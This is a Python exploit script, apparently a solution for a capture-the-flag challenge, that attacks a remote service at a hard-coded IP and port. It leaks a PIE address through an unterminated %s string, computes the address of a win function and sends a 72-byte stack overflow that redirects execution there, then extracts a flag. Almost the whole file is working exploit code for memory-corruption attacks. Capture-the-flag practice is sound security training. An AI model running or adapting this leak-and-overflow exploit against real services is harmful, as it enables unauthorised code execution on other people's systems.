#!/usr/bin/env python3
# Challenge 2 - SpeedRun : %s PIE leak in register_runner + tutorial() overflow -> ret2win
import socket, struct, re, time
HOST, PORT = "47.128.14.16", 1337
WIN_OFF, LEAK_OFF = 0x12a6, 0x1532

def recv_until(s, marker, t=3.0):
    s.settimeout(t); buf=b""
    try:
        while marker not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
    except socket.timeout: pass
    return buf

s=socket.socket(); s.settimeout(6); s.connect((HOST,PORT))
recv_until(s, b"runner tag:")

s.sendall(b"A"*56)                                   # leak base+0x1532 via %s
resp = recv_until(s, b"Registered runner:") + recv_until(s, b"\n")
after = resp[resp.find(b"A"*56)+56:]
leak  = struct.unpack("<Q", after.split(b"\n",1)[0][:6].ljust(8,b"\x00"))[0]
base  = leak - LEAK_OFF
win   = base + WIN_OFF
assert base & 0xfff == 0, "bad leak 0x%x" % leak
print("[*] base=0x%x  win=0x%x" % (base, win))

recv_until(s, b"> ")
s.sendall(b"A"*72 + struct.pack("<Q", win))          # offset 72 -> ret2win

time.sleep(0.4); s.settimeout(2.5); out=b""
try:
    while True:
        d=s.recv(4096)
        if not d: break
        out+=d
except socket.timeout: pass
m=re.search(rb"MPTC\{[^}]*\}", out)
print("[+] FLAG:", m.group().decode() if m else out[-200:])
